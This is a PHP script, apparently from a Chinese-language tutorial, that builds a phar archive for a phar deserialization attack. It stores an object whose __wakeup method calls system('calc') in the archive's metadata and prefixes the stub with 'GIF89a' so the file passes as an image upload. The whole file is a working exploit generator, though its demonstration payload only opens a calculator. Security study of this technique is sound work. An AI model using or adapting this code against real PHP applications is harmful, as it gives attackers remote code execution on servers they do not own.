<?php
class A {
    public $s = '';
    public function __wakeup () {
        system("calc");
    }
}


@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a "."__HALT_COMPILER(); ?>"); //设置stub
$o = new A();
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>